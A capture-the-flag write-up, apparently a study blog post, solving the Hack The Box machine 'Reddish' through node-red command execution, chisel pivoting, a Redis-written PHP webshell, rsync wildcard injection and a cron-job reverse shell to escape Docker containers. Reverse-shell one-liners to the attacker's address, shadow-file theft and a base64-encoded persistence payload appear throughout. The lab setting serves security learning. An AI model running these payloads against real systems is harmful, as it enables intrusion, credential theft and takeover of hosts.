---
layout: post
title: "reddish"
date: 2025-10-19 
categories: CPTS Playlist
---
# reddish

# Summary

- HTTP verb tampering (POST) to get json reply for node-red management
- Use node-red to create TCP connection to attack host
- ping sweep to find more hosts; upload static nmap to find open services port 80 web page and port 6379 redis on different hosts
- upload chisel; chisel tunnel; remote port forwarding to access services
- the web page and redis databases are using shared web folder; redis requires no authentication to update db; create webshell; execute reverse shell to gain foothold on host www
- look for cron jobs to find command injection vulnerability; create privileged dash shell to get root privilege on www
- use rsync as root to find backup server, running cron daemon; upload reverse shell cron job as root using rsync
- create chisel tunnel to use node-red as proxy server; connect back to localhost
- reverse shell executed, shell received on localhost
- linpeas to enumerate host; /dev mounted; look for sda drives
- mount sda drives; one of the drives contain /root/root.txt

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sV -sC -oN nmap/reddish 10.10.10.94
```

No result. Let’s do a full port scan:

```bash
sudo nmap -p- 10.10.10.94 -v --min-rate=10000 -oN nmap/reddish-all-ports

PORT     STATE SERVICE
1880/tcp open  vsat-control

```

Let’s scan that port:

```bash
sudo nmap -sC -sV -oN nmap/reddish2 10.10.10.94 -p 1880

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error
```

Let’s also perform a UDP scan on snmp ports:

```bash
sudo nmap -sU 10.10.10.94 -p161,162

PORT    STATE  SERVICE
161/udp closed snmp
162/udp closed snmptrap
```

## HTTP port 1880

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/reddish/image.png)

Let’s get the favicon.ico:

```bash
curl -O http://10.10.10.94:1880/favicon.ico
```

Now saving the image again as a jpeg, let’s search use Google image search to see what this is:

![image.png]({{ site.baseurl }}/assets/reddish/image%201.png)

It seems to be node red.

![image.png]({{ site.baseurl }}/assets/reddish/image%202.png)

It seems we are getting the CANNOT GET / because the web root is not situated there. Let’s attempt to fuzz to try and find the web root for node red:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.94:1880/FUZZ -ic

icons                   [Status: 301, Size: 169, Words: 7, Lines: 10, Duration: 18ms]
red                     [Status: 301, Size: 165, Words: 7, Lines: 10, Duration: 12ms]
vendor                  [Status: 301, Size: 171, Words: 7, Lines: 10, Duration: 12ms]
```

However, non of it returned the UI. The all returned CANNOT GET /

We capture the a request on burp and try other HTTP verbs. We try POST request to /, we then get a response:

![image.png]({{ site.baseurl }}/assets/reddish/image%203.png)

```bash
{"id":"992b1a89256cb8845af8f8af0c0071f5","ip":"::ffff:10.10.16.4","path":"/red/{id}"}
```

Let’s visit the path:

```bash
http://10.10.10.94:1880/red/992b1a89256cb8845af8f8af0c0071f5
```

![image.png]({{ site.baseurl }}/assets/reddish/image%204.png)

We are on the web ui. 

ON the top right-hand side, we click on the drop down menu bar, we find out the version is: 

![image.png]({{ site.baseurl }}/assets/reddish/image%205.png)

It seems we can use node-red to create a TCP connection onto the server. First, from the input, we drag a TCP button and set it to the following settings:

```bash
Connect to
Port 4444
at host 10.10.16.4
```

![image.png]({{ site.baseurl }}/assets/reddish/image%206.png)

In the advanced tab, we find function to exec:

![image.png]({{ site.baseurl }}/assets/reddish/image%207.png)

Now let’s direct the output to our host as well. In the output section, we find another TCP function and let’s map the stdout, stderr and error code to our host:

![image.png]({{ site.baseurl }}/assets/reddish/image%208.png)

Let’s settings to Reply To TCP:

![image.png]({{ site.baseurl }}/assets/reddish/image%209.png)

Now let’s start a listener, and after clicking on deploy, we will see a connection:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2010.png)

## Node-red Foothold

Let’s find out our IP address:

```bash
[object Object]cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.3      nodered
172.18.0.2      nodered
[object Object]hostname
nodered

```

It seems we are in a private network. We cannot cd to other directories. Let’s connect back to us with a real reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.4/4445 0>&1"
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2011.png)

Let’s run linpeas to enumerate the target fully:

```bash
#attack host
nc -lnvp 8001 < linpeas.sh

#target
cat < /dev/tcp/10.10.16.4/8001 > linpeas.sh
```

Interesting Outputs:

```bash
╔══════════╣ Container & breakout enumeration
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html
═╣ Container ID ................... nodered═╣ Container Full ID .............. c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
══╣ Security Mechanisms
═╣ Seccomp enabled? ............... enabled
═╣ AppArmor profile? .............. docker-default (enforce)
═╣ User proc namespace? ........... enabled         0          0 4294967295
══╣ Known Vulnerabilities
═╣ Vulnerable to CVE-2019-5021 .... No

═╣ Container escape tools present .. /usr/bin/nsenter
══╣ Runtime Vulnerabilities
══╣ Breakout via mounts
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/sensitive-mounts.html
═╣ /proc mounted? ................. Yes
═╣ /dev mounted? .................. No
═╣ Run unshare .................... No
═╣ release_agent breakout 1........ Yes
═╣ release_agent breakout 2........ No
═╣ release_agent breakout 3........
═╣ core_pattern breakout .......... No
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... No
═╣ Docker socket mounted? ......... No
═╣ Common host filesystem mounted?  /dev/sda2 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)
═╣ Interesting mounts ............. overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/GWNHWU65AYNRU6Y3QPS3AZEHXU:/var/lib/docker/overlay2/l/GDVJ4H535AMQNU6WZ2FY2VMPUZ:/var/lib/docker/overlay2/l/H62XPW7L4KUDWBHP7HMSDHEQ72:/var/lib/docker/overlay2/l/OZPJWNGLMJDG5H4MS2EJCJKODJ:/var/lib/docker/overlay2/l/535GQEKUEOQEHEGFBSIUCV72UE:/var/lib/docker/overlay2/l/KP3HKB3LZVIYEBIHT4GGM7QOCD:/var/lib/docker/overlay2/l/HZFR4I56OJZ5E7PXQ6VE4ILWVB:/var/lib/docker/overlay2/l/WSKZU3BWXJXR5FPQZDPD4DIHXY:/var/lib/docker/overlay2/l/BEWUMTONK4KGWVPHZ5MKVYTKIY:/var/lib/docker/overlay2/l/Z5QBGAGUKEYGRYMI6MICDNLJO3:/var/lib/docker/overlay2/l/ZEGJUNT5MQYJKPZGRUKFCRD7MH:/var/lib/docker/overlay2/l/BAO3C225NWRRJIKO4OCPFAEIGS:/var/lib/docker/overlay2/l/OPOC6CXGJW2YFIXXHD42CMAMT7:/var/lib/docker/overlay2/l/RQHCOGNZNXHBT27S4YMC243HDZ:/var/lib/docker/overlay2/l/Y5IQC7PIMO75VAP7I7NBGTOZOC,upperdir=/var/lib/docker/overlay2/0050bdbde2960b15c4474263bde71db954f03274c84752a440a44a9e4e12742a/diff,workdir=/var/lib/docker/overlay2/0050bdbde2960b15c4474263bde71db954f03274c84752a440a44a9e4e12742a/work)
═╣ Writable mount points ......... overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/GWNHWU65AYNRU6Y3QPS3AZEHXU:/var/lib/docker/overlay2/l/GDVJ4H535AMQNU6WZ2FY2VMPUZ:/var/lib/docker/overlay2/l/H62XPW7L4KUDWBHP7HMSDHEQ72:/var/lib/docker/overlay2/l/OZPJWNGLMJDG5H4MS2EJCJKODJ:/var/lib/docker/overlay2/l/535GQEKUEOQEHEGFBSIUCV72UE:/var/lib/docker/overlay2/l/KP3HKB3LZVIYEBIHT4GGM7QOCD:/var/lib/docker/overlay2/l/HZFR4I56OJZ5E7PXQ6VE4ILWVB:/var/lib/docker/overlay2/l/WSKZU3BWXJXR5FPQZDPD4DIHXY:/var/lib/docker/overlay2/l/BEWUMTONK4KGWVPHZ5MKVYTKIY:/var/lib/docker/overlay2/l/Z5QBGAGUKEYGRYMI6MICDNLJO3:/var/lib/docker/overlay2/l/ZEGJUNT5MQYJKPZGRUKFCRD7MH:/var/lib/docker/overlay2/l/BAO3C225NWRRJIKO4OCPFAEIGS:/var/lib/docker/overlay2/l/OPOC6CXGJW2YFIXXHD42CMAMT7:/var/lib/docker/overlay2/l/RQHCOGNZNXHBT27S4YMC243HDZ:/var/lib/docker/overlay2/l/Y5IQC7PIMO75VAP7I7NBGTOZOC,upperdir=/var/lib/docker/overlay2/0050bdbde2960b15c4474263bde71db954f03274c84752a440a44a9e4e12742a/diff,workdir=/var/lib/docker/overlay2/0050bdbde2960b15c4474263bde71db954f03274c84752a440a44a9e4e12742a/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/keys type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/timer_list type tmpfs (rw,nosuid,size=65536k,mode=755)
tmpfs on /proc/sched_debug type tmpfs (rw,nosuid,size=65536k,mode=755)
═╣ Shared mount points ........... ══╣ Capability Checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/capabilities-abuse-escape.html
═╣ Dangerous capabilities ......... Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
═

                              ╔═════════════════════╗       
══════════════════════════════╣ Network Information ╠══════════════════════════════  
                              ╚═════════════════════╝                                                                                          
╔══════════╣ Interfaces                                                
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                    
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                      
    inet 127.0.0.1/8 scope host lo                                     
       valid_lft forever preferred_lft forever                         
13: eth1@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff                                                                                         
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1            
       valid_lft forever preferred_lft forever                         
17: eth0@if18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default                                                 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff                 
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0            
       valid_lft forever preferred_lft forever
       
       
══╣ Hosts File Information                                                                                                                     
Contents of /etc/hosts:                                                                                                                        
  127.0.0.1     localhost                                              
  ::1   localhost ip6-localhost ip6-loopback                           
  fe00::0       ip6-localnet                                                                                                                   
  ff00::0       ip6-mcastprefix                                        
  ff02::1       ip6-allnodes                                           
  ff02::2       ip6-allrouters                                                                                                                 
  172.19.0.3    nodered                                                
  172.18.0.2    nodered         
```

Going on hacktricks for containerisation breakout, let’s test if /proc is writable; if it is, we might be able to break out of the container, and execute code on the actual host. This post goes more in depth on how the exploit works.

If /proc/sys/kernel/core_pattern is writable by a non-root user (e.g., due to a misconfiguration or container escape scenario), an attacker can modify it to pipe crash data to a malicious script.

First, let’s check if /proc/sys/kernel/core_pattern is writable

```bash
echo "testing" > /proc/sys/kernel/core_pattern 

bash: /proc/sys/kernel/core_pattern: Read-only file system
```

Looks like we cannot write to this; therefore we cannot perform the exploit. Another method we can try to breakout the docker container is using the capability cap_dac_override

https://blog.1nf1n1ty.team/hacktricks/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override

We can try and leverage this capability to write a new user with root permission in the passwd file. However, we do not see a ssh port open, so there are no ways of logging in. 

Let’s perform a ping sweep on the target and see what other available hosts there are:

```bash
for i in $(seq 254); do ping 172.18.0.$i -c1 -W1 & done | grep from

64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.030 ms
64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.033 ms
```

The .1 host is probably a Docker bridge (often called docker0 or a custom bridge network) that acts as the gateway, routing traffic between containers on the same network and to the outside world (like the host machine or external networks).

In Docker setups, the .1 address is typically reserved for this bridge interface, which handles NAT, forwarding, and connectivity for the containers. It's not a separate physical device or a containerized host running applications; it's infrastructure managed by Docker itself.  The .2 host is ourself. 

Let’s move on to the .19 subnet:

```bash
for i in $(seq 254); do ping 172.19.0.$i -c1 -W1 & done | grep from

64 bytes from 172.19.0.3: icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.061 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.062 ms
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.039 ms

```

Again, the .1 is not probably the docker bridge, .3 is ourself. Let’s scan the .2 and .4 network. We can upload a static nmap binary to our host:

```bash
#attack host
nc -lnvp 8001 -q0 < nmap

cd ~/tools/nmap/x86/data
nc -lnvp 8001 -q0 < nmap-services

#target
cat < /dev/tcp/10.10.16.4/8001 > nmap
cat < /dev/tcp/10.10.16.4/8001 > /etc/services
```

Now let’s scan for open ports:

```bash
chmod +x nmap 

./nmap 172.19.0.2 -Pn -p- --min-rate=10000

PORT     STATE SERVICE
6379/tcp open  redis
MAC Address: 02:42:AC:13:00:02 (Unknown)
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2012.png)

It’s a database.

The next IP:

```bash
./nmap 172.19.0.4

 PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:04 (Unknown)
```

Or if we want to scan all the ports:

```bash
./nmap 172.19.0.4 -Pn -p- --min-rate=10000
```

Still only port 80. 

## Chisel Tunneling

Let’s upload chisel over so we can local port forward 80 to our host. First we need the right version. The box came out in 2018, so we probably need a 2018 chisel. We can find it in at https://github.com/jpillora/chisel/releases?page=3. Let’s download the latest version, 1.3.0

```bash
#on attack
nc -lnvp 8001 -q0 < chisel

#on target

cat < /dev/tcp/10.10.16.4/8001 > chisel
```

Now let’s start the server, connect from target and local port forward 80 from host .4:

```bash
#on attack
./chisel server -p 8005 -reverse -v

#local port forward
./chisel client 10.10.16.4:8005 R:80:172.19.0.4:80
```

Now let’s visit port 80 on our attack box:

```bash
http://localhost:80
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2013.png)

Viewing the page source, we find an interesting function:

```bash
					/*
							* TODO
							*
							* 1. Share the web folder with the database container (Done)
								* 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
							* ...Still don't know how to complete it...
						*/
						function backupDatabase() {
								$.ajax({
										url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
										cache: false,
										dataType: "text",
										success: function (data) {
											console.log("Database saved:", data);
										},
										error: function () {
										}
								});
						}
		</script>
```

That snippet is a small **JavaScript function** (using jQuery’s `$.ajax`) that triggers a **database backup** on the server via an HTTP request.

Let’s try out the function:

```bash
http://localhost:80/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd
```

We get a fatal error. Does not work. Maybe, the redis service we found on .2 is the database. From the note, the database container share the same web folder, therefore, if we can drop a php script in there, maybe we can get it to execute php code. First, let’s forward port 6379 from 172.19.0.2. We need another reverse shell, execute this in the original node-red shell:

```bash
#on attack
nc -lnvp 4446

#on node-red
bash -c "bash -i >& /dev/tcp/10.10.16.4/4446 0>&1"
```

On the new shell, let’s enable reverse (remote) port forwarding.

```bash
./chisel client 10.10.16.4:8005 R:6379:172.19.0.2:6379 &
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2014.png)

We get a connected response. Now, check if authentication is required on the redis service:

```bash
nc localhost 6379

echo "Hey no AUTH required!"
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2015.png)

We no don’t need. Now let’s create our payload in a variable, then set the configuration file in /var/www/html

```bash
flushall

set new '<?php system($_REQUEST["cmd"]); ?>'

config set dbfilename web.php

config set dir /var/www/html

save
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2016.png)

Now, if we visit our webshell:

```bash
http://localhost/web.php
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2017.png)

It did. Now let’s get a reverse shell. First, capture the request on burp, change the request method to POST, and:

```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1'
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2018.png)

Since the host only have internal IP address, we are not reachable. We need to use chisel again to port forward. Let’s use our node-red host as the pivot.

Now , let’s enable local port forward on port 9001:

```bash
./chisel client 10.10.16.4:8005 9001:localhost:9001 &
```

Now, let’s start a listener:

```bash
#on attack
nc -lnvp 9001
```

Let’s change our payload to listen on the .3 network:

```bash
cmd=bash -c 'bash -i >& /dev/tcp/172.19.0.3/9001 0>&1'
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2019.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/reddish/image%2020.png)

## WWW host

Enumerating the host, we find a /backup dir. We find a script backup.sh:

```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

The script backups file up with rsync, however, since there is a wildcard use for input files, there is a command injection vulnerability here. 

Searching rsync up in gtfobin, we find that if we use the `-e` option, we can execute commands and break out of rsync. 

We can name our file `FILE.rdb -e OUR_COMMAND;` . Let’s find out if this script is ran by root as a cron job:

```bash
www-data@www:/etc/apache2/sites-available$ ls /etc/cron*
ls /etc/cron*
/etc/crontab

/etc/cron.d:
backup

/etc/cron.daily:
apache2  apt  dpkg  exim4-base  passwd

/etc/cron.hourly:

/etc/cron.monthly:

/etc/cron.weekly:

```

```bash
cat /etc/cron.d/backup

*/3 * * * * root sh /backup/backup.sh
```

The script is ran every 3 minutes by root. Let’s exploit it. We craft our payload. Let’s copy a /bin/dash shell and give it SUID privileges, since it does not drop privileges. Our payload is:

```bash
#!/bin/sh

cp /bin/dash /tmp/suid
chmod 4755 /tmp/suid
```

Let’s save that to a file.rdb e.g.  script in the /var/www/html/f187a0ec71ce99642e4f0afbd441a68b dir.

```bash
#on attack
nc -lnvp 8001 -q0 < privesc

#on node-red, we need another local port forward:
./chisel client 10.10.16.4:8005 8001:localhost:8001 &

#on www

cd /tmp
cat < /dev/tcp/172.19.0.3/8001 > privesc.rdb
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
cp /tmp/privesc.rdb privesc.rdb

```

Now let’s create our malicious filename

```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b

touch -- "-e sh privesc.rdb"
```

Now after 3 minutes, we look in the tmp folder:

```bash
ls -l /tmp

total 128
-rw-r--r-- 1 www-data www-data     55 Oct 18 15:37 privesc.rdb
-rwsr-xr-x 1 root     root     125400 Oct 18 15:48 suid
```

Now let’s execute it:

```bash
./suid
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2021.png)

Even though we are root, we are still on the container. 

From the backup command:

```bash
rsync -a *.rdb rsync://backup:873/src/rdb/
```

We know there is a backup server somewhere. Let’s look at our /etc/hosts file:

```bash
cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.19.0.4      www
172.20.0.3      www
```

It does not tell us. Let’s try pinging backup and see which IP address it goes:

```bash
ping -c1 backup

PING backup (172.20.0.2) 56(84) bytes of data.
64 bytes from reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2): icmp_seq=1 ttl=64 time=0.042 ms

--- backup ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.042/0.042/0.042/0.000 ms
```

We now know the IP is 172.20.0.2. Let’s also try to retrieve a file with rsync. Read and write operations:

```bash
# Read file from remote
rsync -av user@remote:/etc/passwd ./passwd_copy

# Write file to remote
rsync -av ./passwd_copy user@remote:/tmp/passwd_copy

```

Let’s try copying:

```bash
rsync -av rsync://backup:873/src/etc/passwd ./passwd
```

Now we have a new file passwd. Let’s see if this is being executed as root, and attempt to read shadow file:

```bash
rsync -av rsync://backup:873/src/etc/shadow ./shadow

rsync -av rsync://backup:873/src/etc/hosts ./hosts

```

We can. 

Let’s see if there are any cron jobs; if there is a file, it’s a pretty good indication that cron jobs are running, if we overwrite that file, we can get it to execute our reverse shell. We can also double check but retrieving the pid file; if it exists, then cron job is running; the following has to be done as root:

```bash
rsync -av rsync://backup:873/src/var/run/crond.pid crond.pid

cat cron.dpid
11
```

Cron daemon is running. If we want a reverse shell, we need to proxy our server through node-red so www can connect to our server via node-red. So our pivot chain 

```bash
attack_server <-> node-red <-> www <- backup

10.10.16.4:8005 server -> node-red forward incoming traffic to 8005 to server -> www connect to proxy-server, which in effect connect to our localhost, forward 9002 to our localhost <- backup reverese shell connection

attack:
server 8005 attack 10.10.16.4

node-red:
forward server 8005 node-red 172.19.0.3 to 10.10.16.4:8005

www:
client 8005 node-red
local port forward 9002 to 10.10.16.4 via chisel tunnel

backup:
reverse shell connect to www (172.20.0.3:9002)
```

Let’s transfer chisel to www:

```bash
#on attack 
nc -vlnp 8001 -q0 < chisel

#on node-red
#we already done this part; this is just reminder it's opened
./chisel client 10.10.16.4:8005 8001:localhost:8001 &

#on www
cat < /dev/tcp/172.19.0.3/8001 > chisel
```

Now, let’s set up connection for www to talk to our server on 10.10.16.4, via our node-red pivot:

```bash
#on node-red
#all connections to localhost 8005 will be forwarded to server 8005, essentially, making node-red a proxy server
./chisel client 10.10.16.4:8005 8005:localhost:8005 &
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2022.png)

Now, on www connect to our proxy server and local port forward 9002 to node-red’s 9002:

```bash
#on www
./chisel client 172.19.0.3:8005 9002:localhost:9002 & 
```

![image.png]({{ site.baseurl }}/assets/reddish/image%2023.png)

Now that we are connected, let’s a reverse shell cron job that executes every minute. First, encrypt our reverse shell payload in b64:

```bash
echo "bash -c 'bash -i >& /dev/tcp/172.20.0.3/9002 0>&1'" | base64

YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzkwMDIgMD4mMScK
```

Now our cron job payload. We have to do the following in root as we need the same permission as the user (root) executing the cron job:

```bash
#on www
./suid

echo "* * * * * root echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjAuMC4zLzkwMDIgMD4mMScK | base64 -d | bash" > rev

```

Now let’s send our cron job; still in our privileged shell:

```bash
rsync -avp rev rsync://backup:873/src/etc/cron.d/rev

sending incremental file list
rev

sent 203 bytes  received 35 bytes  476.00 bytes/sec
total size is 96  speedup is 0.40
```

Now start our listener:

```bash
nc -lnvp 9002
```

After a minute, we get our shell:

![image.png]({{ site.baseurl }}/assets/reddish/image%2024.png)

## backup host

It seems like we are still in a docker. Let’s upload linpeas and enumerate the host to find ways to break out. First, let’s set up a chisel tunnel to transfer files:

```bash
#on www
./chisel client 172.19.0.3:8005 8001:localhost:8001 &
```

Now on our attack host:

```bash
#on attack
nc -lnvp 8001 -q0 < linpeas.sh

#on backkup
cat < /dev/tcp/172.20.0.3/8001 > linpeas.sh
```

Now let’s execute it:

```bash
chmod +x linpeas.sh

./linpeas.sh
```

Interesting output:

![image.png]({{ site.baseurl }}/assets/reddish/image%2025.png)

Since /dev is mounted, let’s look for sda, which is usually the mounted SSD drives. 

```bash
ls -l /dev/sda*

brw-rw---- 1 root disk 8, 0 Oct 19 14:24 /dev/sda
brw-rw---- 1 root disk 8, 1 Oct 19 14:24 /dev/sda1
brw-rw---- 1 root disk 8, 2 Oct 19 14:24 /dev/sda2
brw-rw---- 1 root disk 8, 3 Oct 19 14:24 /dev/sda3
```

Let’s create directories to mount the drives

```bash
mkdir sda{1,2,3}
```

Now let’s mount all the drives:

```bash
mount /dev/sda1 sda1
mount /dev/sda2 sda2
mount /dev/sda3 sda3

```

Now looking through each drive, we find sda2 filesystem looks similar to a normal Linux filesystem structure. In /root dir, we find root.txt.